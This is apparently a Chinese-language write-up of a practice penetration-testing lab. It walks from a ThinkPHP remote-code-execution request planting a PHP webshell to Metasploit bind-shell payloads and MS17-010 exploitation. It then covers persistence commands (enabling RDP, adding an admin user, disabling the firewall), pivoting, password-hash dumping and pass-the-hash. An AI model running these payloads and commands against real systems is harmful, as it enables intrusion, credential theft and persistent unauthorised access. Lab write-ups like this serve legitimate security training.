+++
series = ["域渗透 学习记录", "内网渗透 学习记录"]
categories = ["渗透测试", "内网渗透", "域渗透"]
tags = ["域渗透", "内网渗透", "渗透测试"]
description = "靶机"
title = "cyberstrikelab-lab1"
date = 2026-07-04T00:30:39+08:00
draft = false
pin = false
+++

1. 突破互联网边界（192.168.10.10）：thinkphp rce
2. 正向shell上线msf（192.168.10.10）
3. 信息收集到20网段
4. 上线fscan存活20.20和20.30主机存活且存在ms17_010
5. msf添加路由
6. 20.20无法使用ms17_010, 20.30只可以使用命令行的ms17_010
7. 强开3389，添加用户，添加管理员组，关防火墙
8. 远程登录192.168.20.30
9. 上传正向shell
10. 正向shell上线msf（192.168.20.30）
11. 提权
12. hashdump
13. 利用域管hash 进行pth攻击，成功拿下192.168.20.20 
# flag1

发现这里是thinkphp框架的 或者用eyou cms的框架漏洞

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520105321688.png)

存在rce  写入一句话木马  

```c
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 192.168.10.10
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.10/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=36n22cd7sqs1oamdd4l10a2mb5
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA/Pg==
```

![](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115126202.png)


```c
http://192.168.10.10/preview/19e38733df609cc8a1e512d9450bd200.php
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115527440.png)
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115604118.png)


go-flag{kn6anDUCzBqtjlX8}


# flag2

配置文件中翻到  可以进行密码复用，先放着

administrator     cyberstrike@2024

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115853553.png)

生成正向木马,因为这个靶场不出网

```
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o 4444.exe
```
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703222909081.png)


蚁剑上传到可执行目录

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703172335838.png)



目标服务器可被攻击者访问，但攻击者主机因处于内网无公网 IP，因此选择正向连接模式。设置正向连接，是我们主动去连接目标主机的4444端口

```
use exploit/multi/handler  # 启用监听模块

set payload windows/x64/meterpreter/bind_tcp  # 匹配生成木马时的payload``

set RHOST 192.168.10.10  # 目标服务器IP地址

set LPORT 4444  # 匹配木马中设置的监听端口``

run  # 启动监听
```

同时运行这个4444.exe

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703172650242.png)

发现弹过来了

```
shell
chcp 65001
ipconfig
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703172835712.png)

发现双网卡   10段和  20段

查看x32/x64

64位的

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703173036554.png)

会话

上传  x64位  fscan

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703174128875.png)

然后使用fscan扫描192.168.20.0/24段

存在msf17—010

```
   192.168.20.30
   192.168.20.20
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703181430260.png)


给 msf 添加路由

```
run autoroute -s 192.168.20.0/24

run autoroute -p
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703181626526.png)

会话挂在后台，然后搜索ms17_010

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703182218789.png)

发现只有 19 才能用，然后执行

执行命令搜索flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703185406959.png)

然后查询flag


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703185708016.png)

go-flag{R0M4QwsS6EQp97lw}

# flag3

做权限维持，修改注册表，强开3389端口，创建用户

```
set COMMAND 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190041560.png)


创建用户

```
set COMMAND 'net user zcx @Admin0421 /add'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190052718.png)


用户添加到管理组


```
set COMMAND 'net localgroup Administrators zcx /add'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190107802.png)

关闭 windows 防火墙

```
set COMMAND 'netsh advfirewall set allprofiles state off'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190206522.png)

用户加白名单

```
set COMMAND 'net localgroup "Remote Desktop Users" zcx /add'
```

信息收集判断是域机器还是什么机器

发现是域环境

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190322773.png)

进测试msf17010对192.168.20.20这台机器无法上线，通过192.168.20.30再次作为跳板机攻击尝试，首先查看20  ->  30是否ping通

```
set command 'ping 192.168.20.20'   
```

发现可以ping 通

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190452088.png)

然后拿 30 的机子作为跳板机进行

msf中开启socks代理

```
search socks
use 0
run
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703190637045.png)


物理机配置proxy

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703220636784.png)


流量只允许这个通过


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703220710857.png)


远程连接

zcx    @Admin0421

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703220853806.png)


制作192.168.20.30上线msf的exe

```
msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f exe -o ~/Desktop/5555.exe
```

创建5555的监听器

```
use exploit/multi/handler  # 启用监听模块
set payload windows/meterpreter/bind_tcp  # 匹配生成木马时的payload
set RHOST 192.168.20.30  # 目标服务器IP地址
set RPORT 5555  # 匹配木马中设置的监听端口
run  # 启动监听
```

同时点击，注意用管理员的身份进行启动

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703221038006.png)

成功上线

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703221006382.png)

提权

```
getsystem
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703221131737.png)

脱hash

```
hashdump
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703221206102.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::
cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::
zcx:1106:aad3b435b51404eeaad3b435b51404ee:1c6a34481e4b7597c20cce14b7487607:::
WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:ca237d6620fbcb7a0fde6ecf2d8c2e02:::
CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:74da64c2f58c51c0a56a7541adadccd5:::
```

拿到hash

```
94bd5248e87cb7f2f9b871d40c903927
```

使用 smbexec 进行横向


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703221337347.png)

拿到最后一个flag 

go-flag{Nb8VOT8X9SbIzyDI}
















